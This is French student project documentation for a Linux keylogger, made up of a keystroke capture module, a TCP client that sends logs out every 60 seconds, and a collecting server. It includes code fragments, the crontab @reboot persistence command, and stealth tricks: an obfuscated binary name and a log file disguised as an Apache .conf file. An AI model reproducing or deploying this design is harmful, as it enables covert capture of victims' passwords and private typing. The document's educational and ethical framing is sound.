# 📖 DOCUMENTATION COMPLÈTE DU PROJET KEYLOGGER

**Auteurs :** Rayane Cathelin, Rafael Duong, Lilian Martin  
**Date :** Janvier 2026  
**Contexte :** Projet BUT 3

---

## 📋 Table des matières

1. [Présentation générale](#1-présentation-générale)
2. [Architecture du projet](#2-architecture-du-projet)
3. [Composants détaillés](#3-composants-détaillés)
   - [Keylogger (key.c)](#31-keylogger-keyc)
   - [Client (client.c)](#32-client-clientc)
   - [Serveur (serv.c)](#33-serveur-servc)
   - [Scripts de lancement](#34-scripts-de-lancement)
4. [Défis technologiques](#4-défis-technologiques)
5. [Flux de données](#5-flux-de-données)
6. [Sécurité et considérations éthiques](#6-sécurité-et-considérations-éthiques)
7. [Installation et déploiement](#7-installation-et-déploiement)

---

## 1. Présentation générale

### 🎯 Objectif du projet

Ce projet implémente un système complet de **capture et transmission de frappes clavier** (keylogger) en environnement Linux. Il s'agit d'un système distribué composé de trois modules indépendants qui communiquent via le réseau TCP/IP.

### 🔧 Technologies utilisées

| Technologie | Utilisation |
|-------------|-------------|
| **Langage C** | Programmation bas niveau pour accès aux périphériques |
| **API Linux Input** | Capture des événements clavier via `/dev/input/` |
| **Sockets TCP/IP** | Communication réseau client-serveur |
| **Bash Scripting** | Automatisation et orchestration |
| **Crontab** | Persistance au démarrage |

---

## 2. Architecture du projet

```
┌─────────────────────────────────────────────────────────────────────┐
│                        MACHINE CIBLE (Linux)                        │
│  ┌─────────────────┐                      ┌─────────────────┐       │
│  │   KEYLOGGER     │  ─────écriture────▶  │   Fichier Log   │       │
│  │   (key.c)       │                      │   (.conf)       │       │
│  └─────────────────┘                      └────────┬────────┘       │
│         ▲                                          │                │
│         │ Lecture périphérique                     │ Lecture        │
│  ┌──────┴───────┐                         ┌────────▼────────┐       │
│  │ /dev/input/  │                         │     CLIENT      │       │
│  │   event3     │                         │   (client.c)    │       │
│  └──────────────┘                         └────────┬────────┘       │
└─────────────────────────────────────────────────────┼───────────────┘
                                                      │ TCP Port 5001
                                                      ▼
┌─────────────────────────────────────────────────────────────────────┐
│                      MACHINE SERVEUR                                │
│  ┌─────────────────┐                      ┌─────────────────┐       │
│  │    SERVEUR      │  ─────écriture────▶  │   Dossier logs/ │       │
│  │   (serv.c)      │                      │   (horodatés)   │       │
│  └─────────────────┘                      └─────────────────┘       │
└─────────────────────────────────────────────────────────────────────┘
```

### 📁 Structure des fichiers

```
keylogger/
├── key.c              # Capture des frappes clavier
├── client.c           # Envoi des données au serveur
├── serv.c             # Réception et archivage des données
├── run.sh             # Script d'orchestration principal
├── start.sh           # Script de démarrage simplifié
├── client             # Exécutable client compilé
├── serv               # Exécutable serveur compilé
├── hiezghighililhg    # Exécutable keylogger (nom obfusqué)
├── README.md          # Documentation utilisateur
└── logs/              # Dossier d'archivage (côté serveur)
```

---

## 3. Composants détaillés

### 3.1 Keylogger (key.c)

#### 📝 Description
Le keylogger est le cœur du système. Il intercepte toutes les frappes clavier au niveau du système d'exploitation Linux en lisant directement les événements du périphérique d'entrée.

#### 🔑 Caractéristiques techniques

| Aspect | Détail |
|--------|--------|
| **Périphérique** | `/dev/input/event3` |
| **Type d'événement** | `EV_KEY` (événements clavier) |
| **Fichier de sortie** | `/etc/apache2/conf-available/linux-config.conf` |
| **Privilèges requis** | `root` (accès aux devices) |

#### ⌨️ Gestion du clavier AZERTY

Le projet intègre une **gestion complète du clavier AZERTY français** avec trois mappings distincts :

```c
const char *keycodes[KEY_MAX + 1];       // Touches normales
const char *keycodes_shift[KEY_MAX + 1]; // Avec Shift
const char *keycodes_altgr[KEY_MAX + 1]; // Avec AltGr
```

**Exemples de mappings :**

| Touche physique | Normal | Shift | AltGr |
|-----------------|--------|-------|-------|
| `KEY_1` | `&` | `1` | - |
| `KEY_2` | `é` | `2` | `~` |
| `KEY_E` | `e` | `E` | `€` |
| `KEY_0` | `à` | `0` | `@` |

#### ⏱️ Horodatage intelligent

Le système ajoute automatiquement un **timestamp** après **10 secondes d'inactivité** :

```c
if (difftime(now, last_input_time) >= 10 || last_input_time == 0) {
    local = localtime(&now);
    strftime(buffer, sizeof(buffer), "\n(%Hh%M:%d/%m) ", local);
    fputs(buffer, fichier);
}
```

**Format du timestamp :** `(HHhMM:JJ/MM)`  
**Exemple :** `(14h35:08/01)` pour le 8 janvier à 14h35

#### 🎯 Gestion des modificateurs

Le système gère en temps réel l'état des touches modificatrices :

```c
if (ev.code == KEY_LEFTSHIFT || ev.code == KEY_RIGHTSHIFT) {
    shift_pressed = (ev.value == 1) ? 1 : 0;
}
if (ev.code == KEY_RIGHTALT) { // AltGr
    altgr_pressed = (ev.value == 1) ? 1 : 0;
}
```

---

### 3.2 Client (client.c)

#### 📝 Description
Le client est responsable de l'**envoi périodique** du fichier de log vers le serveur distant via une connexion TCP.

#### 🔧 Configuration

| Paramètre | Valeur |
|-----------|--------|
| **Port** | 5001 |
| **Adresse serveur** | 127.0.0.1 (localhost par défaut) |
| **Taille buffer** | 1024 octets |
| **Fichier source** | `/etc/apache2/conf-available/linux-config.conf` |

#### 📤 Processus d'envoi

```
1. Création du socket TCP
2. Connexion au serveur (IP:PORT)
3. Envoi du nom de fichier
4. Lecture du fichier local par blocs de 1024 octets
5. Transmission de chaque bloc via send()
6. Fermeture de la connexion
```

#### 💻 Code clé - Transmission par blocs

```c
size_t bytes;
while ((bytes = fread(buffer, 1, BUFFER_SIZE, fp)) > 0) {
    send(sock, buffer, bytes, 0);
}
```

---

### 3.3 Serveur (serv.c)

#### 📝 Description
Le serveur écoute les connexions entrantes et **archive chaque transmission** dans un fichier distinct horodaté.

#### 🔧 Configuration

| Paramètre | Valeur |
|-----------|--------|
| **Port d'écoute** | 5001 |
| **Dossier de logs** | `../logs/` |
| **Connexions en attente** | 5 |
| **Taille buffer** | 1024 octets |

#### 📥 Processus de réception

```
1. Création du socket serveur
2. Liaison au port 5001 (bind)
3. Mise en écoute (listen)
4. Boucle infinie :
   a. Acceptation d'une connexion client
   b. Suppression des anciens fichiers .conf
   c. Génération du nom de fichier horodaté
   d. Création et écriture du fichier
   e. Fermeture de la connexion
```

#### 📅 Nommage des fichiers

```c
strftime(time_str, sizeof(time_str), "%d-%m-%Y_%Hh%M%S", local);
snprintf(filename, sizeof(filename), "%s/linux-config_%s.conf", log_dir, time_str);
```

**Exemple :** `linux-config_08-01-2026_14h35.conf`

#### 🗂️ Gestion automatique du dossier logs

```c
if (stat(log_dir, &st) == -1) {
    if (mkdir(log_dir, 0755) == -1) {
        perror("Erreur création dossier logs");
        exit(EXIT_FAILURE);
    }
}
```

---

### 3.4 Scripts de lancement

#### 📜 run.sh - Orchestrateur principal

Ce script gère l'ensemble du cycle de vie de l'application :

| Fonctionnalité | Description |
|----------------|-------------|
| **Persistance** | Ajout automatique à la crontab (`@reboot`) |
| **Démarrage unique** | Vérification avec `pgrep` avant lancement |
| **Boucle client** | Exécution du client toutes les 60 secondes |

```bash
# Ajout à la crontab si absent
if ! crontab -l 2>/dev/null | grep -q "$SCRIPT_PATH"; then
  (crontab -l 2>/dev/null; echo "@reboot $SCRIPT_PATH") | crontab -
fi
```

#### 📜 start.sh - Script de démarrage simplifié

```bash
#!/bin/bash
sudo ./run.sh &
```

Lance le script principal en arrière-plan avec les privilèges root.

---

## 4. Défis technologiques

### 🔴 Défi 1 : Accès bas niveau au clavier Linux

**Problème :** Sous Linux, l'accès aux périphériques d'entrée nécessite des privilèges root et une compréhension de l'API Input.

**Solution :**
- Utilisation de `/dev/input/eventX` pour accéder aux événements bruts
- Structure `input_event` de `<linux/input.h>`
- Lecture bloquante des événements avec `read()`

```c
struct input_event ev;
ssize_t n = read(fd, &ev, sizeof(ev));
```

**Difficultés rencontrées :**
- Identification du bon périphérique (`event3` peut varier selon les machines)
- Nécessité des droits root pour lire `/dev/input/`

---

### 🔴 Défi 2 : Mapping complet du clavier AZERTY

**Problème :** Le kernel Linux renvoie des codes de touches (KEY_Q, KEY_W...) basés sur le layout QWERTY américain. Il faut convertir vers AZERTY.

**Solution :** Création de 3 tables de mapping (156+ entrées) :
- `keycodes[]` : touches sans modificateur
- `keycodes_shift[]` : touches avec Shift
- `keycodes_altgr[]` : touches avec AltGr

**Complexité :** 
- La ligne des chiffres en AZERTY (& é " ' ( - è _ ç à) devient les chiffres avec Shift
- AltGr permet d'accéder à des caractères spéciaux (`@`, `#`, `€`, `[`, `]`, etc.)

---

### 🔴 Défi 3 : Gestion des modificateurs en temps réel

**Problème :** Les touches Shift et AltGr modifient le comportement des autres touches. Il faut tracker leur état (pressé/relâché).

**Solution :** Variables d'état mises à jour à chaque événement :

```c
int shift_pressed = 0;
int altgr_pressed = 0;

if (ev.code == KEY_LEFTSHIFT || ev.code == KEY_RIGHTSHIFT) {
    shift_pressed = (ev.value == 1) ? 1 : 0;
}
```

**Subtilité :** `ev.value` vaut 1 pour appui, 0 pour relâchement, 2 pour répétition auto.

---

### 🔴 Défi 4 : Communication réseau fiable

**Problème :** Transmettre un fichier de taille variable de manière fiable via TCP.

**Solution :**
- Lecture du fichier par blocs de 1024 octets
- Envoi séquentiel avec gestion des erreurs
- Réception côté serveur jusqu'à fermeture de connexion

**Points critiques :**
- Gestion des connexions simultanées (boucle `accept()`)
- Timeout et reconnexion automatique via la boucle du script

---

### 🔴 Défi 5 : Persistance et discrétion

**Problème :** Le système doit :
1. Survivre aux redémarrages
2. Être difficile à détecter

**Solutions :**
- **Crontab** : Lancement automatique au boot (`@reboot`)
- **Nom obfusqué** : L'exécutable s'appelle `hiezghighililhg`
- **Emplacement discret** : Fichier log dans `/etc/apache2/conf-available/` (répertoire système légitime)
- **Extension .conf** : Fichier déguisé en configuration Apache

---

### 🔴 Défi 6 : Horodatage contextuel

**Problème :** Comment segmenter les logs de manière intelligente sans saturer le fichier de timestamps ?

**Solution :** Ajout d'un timestamp uniquement après **10 secondes d'inactivité** :

```c
if (difftime(now, last_input_time) >= 10 || last_input_time == 0) {
    // Ajouter timestamp
}
```

**Avantage :** Les sessions de frappe sont naturellement regroupées, facilitant l'analyse.

---

### 🔴 Défi 7 : Archivage et rotation des logs

**Problème :** Comment éviter l'accumulation de fichiers et garder un historique propre ?

**Solution côté serveur :**
- Suppression des anciens fichiers avant chaque réception
- Création d'un nouveau fichier horodaté à chaque transmission

```c
system("rm -f ../logs/*.conf");
```

---

## 5. Flux de données

### 🔄 Cycle complet de fonctionnement

```
┌────────────────────────────────────────────────────────────────────────┐
│                            FLUX TEMPOREL                               │
├────────────────────────────────────────────────────────────────────────┤
│                                                                        │
│  T+0s     ┌──────────────┐                                             │
│  ──────▶  │ Démarrage    │ start.sh lance run.sh                       │
│           └──────┬───────┘                                             │
│                  ▼                                                     │
│  T+1s     ┌──────────────┐                                             │
│  ──────▶  │ Keylogger    │ Commence la capture (key.c → .conf)         │
│           └──────┬───────┘                                             │
│                  │                                                     │
│                  ▼ (capture continue)                                  │
│  T+60s    ┌──────────────┐                                             │
│  ──────▶  │ Client       │ Envoie le fichier .conf au serveur          │
│           └──────┬───────┘                                             │
│                  ▼                                                     │
│  T+60s    ┌──────────────┐                                             │
│  ──────▶  │ Serveur      │ Reçoit et archive dans logs/                │
│           └──────┬───────┘                                             │
│                  │                                                     │
│                  ▼ (répétition toutes les 60s)                         │
│  T+120s   ┌──────────────┐                                             │
│  ──────▶  │ Client       │ Nouvel envoi...                             │
│           └──────────────┘                                             │
│                                                                        │
└────────────────────────────────────────────────────────────────────────┘
```

### 📊 Format des données capturées

**Exemple de contenu du fichier .conf :**

```
(14h25:08/01) Bonjour, voici mon mot de passe : P@ssw0rd123
(14h30:08/01) Je vais maintenant ouvrir mon email sur gmail.com
(14h32:08/01) utilisateur@gmail.com
```

---

## 6. Sécurité et considérations éthiques

### ⚠️ Avertissement légal

> **ATTENTION :** L'utilisation d'un keylogger sans le consentement explicite de l'utilisateur est **ILLÉGALE** dans la plupart des pays. Ce projet est réalisé dans un **cadre éducatif uniquement**.

### 🔒 Aspects de sécurité du projet

| Aspect | Implémentation | Risque potentiel |
|--------|----------------|------------------|
| **Privilèges root** | Nécessaire pour `/dev/input/` | Compromission système |
| **Communication TCP** | Non chiffrée (port 5001) | Interception réseau |
| **Stockage local** | Fichier texte en clair | Lecture par tiers |
| **Persistance** | Crontab modifiée | Détection par audit |

### 🛡️ Recommandations pour un usage éthique

1. **Obtenir le consentement** de l'utilisateur
2. **Chiffrer les données** en transit (TLS) et au repos
3. **Limiter la rétention** des données
4. **Documenter l'usage** prévu
5. **Respecter le RGPD** et les lois locales

---

## 7. Installation et déploiement

### 📦 Prérequis

```bash
# Système Linux avec accès root
# GCC pour la compilation
sudo apt install build-essential
```

### 🔨 Compilation

```bash
# Compilation du keylogger
gcc -o hiezghighililhg key.c

# Compilation du client
gcc -o client client.c

# Compilation du serveur
gcc -o serv serv.c
```

### 🚀 Lancement

**Côté serveur :**
```bash
./serv
# Output: Serveur en écoute sur le port 5001...
```

**Côté client (machine cible) :**
```bash
sudo ./start.sh
```

### ✅ Vérification du bon fonctionnement

```bash
# Vérifier que le keylogger tourne
ps aux | grep hiezghighililhg

# Vérifier la crontab
crontab -l | grep run.sh

# Vérifier les logs côté serveur
ls -la logs/
```

### 🔧 Configuration avancée

| Paramètre | Fichier | Variable | Valeur par défaut |
|-----------|---------|----------|-------------------|
| Port réseau | client.c / serv.c | `PORT` | 5001 |
| IP serveur | client.c | `inet_pton()` | 127.0.0.1 |
| Périphérique clavier | key.c | `device` | /dev/input/event3 |
| Délai entre envois | run.sh | `sleep` | 60 secondes |
| Délai timestamp | key.c | `difftime()` | 10 secondes |

---

## 📚 Conclusion

Ce projet illustre les principes fondamentaux de :
- **Programmation système Linux** (accès aux périphériques)
- **Programmation réseau** (sockets TCP/IP)
- **Automatisation** (scripts bash, crontab)
- **Sécurité informatique** (compréhension des menaces)

Il démontre la complexité technique nécessaire pour implémenter un keylogger fonctionnel tout en soulignant l'importance cruciale de l'éthique et de la légalité dans le domaine de la sécurité informatique.

---

*Document généré pour le projet BUT 3 - Janvier 2026*

